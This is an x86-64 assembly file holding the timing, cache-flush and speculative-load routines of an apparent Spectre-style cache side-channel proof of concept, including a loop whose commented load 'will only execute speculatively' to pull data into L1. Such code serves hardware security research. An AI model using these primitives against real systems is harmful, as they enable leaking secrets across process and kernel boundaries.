global _time_load
global _cache_flush
global _run_attempt

extern _bools
extern _values
extern _pointers

section .text

_time_load:
	rdtscp
	mov r9, rax
	inc byte [rdi]
	rdtscp
	dec byte [rdi]
	sub rax, r9
	ret

_cache_flush:
	clflush [rdi]
	ret

_run_attempt:
	push    rbp
	mov     rbp, rsp
	push    r15
	push    r14
	push    r13
	push    r12
	push    rbx
	push    rax
	mov     r14, 0FFFFFFFFFFFFE000h
	lea     rbx, [rel _bools]
	lea     r15, [rel _values]
	mov     ecx, edi
	
loop:
	lea     rax, [rel _pointers]
	mov     r13, [rax+r14+2000h]
	mov     rdi, rbx
	clflush [rbx]
	mov     edi, [rbx]

	cmp     edi, 0
	jnz     skip

	; access the pointer - this instruction will
	; only execute speculatively, but load P into L1
	movzx   eax, byte [r13]

skip:
	add     rbx, 4
	inc     r15
	add     r14, 8
	jnz     loop
	add     rsp, 8
	pop     rbx
	pop     r12
	pop     r13
	pop     r14
	pop     r15
	pop     rbp
	retn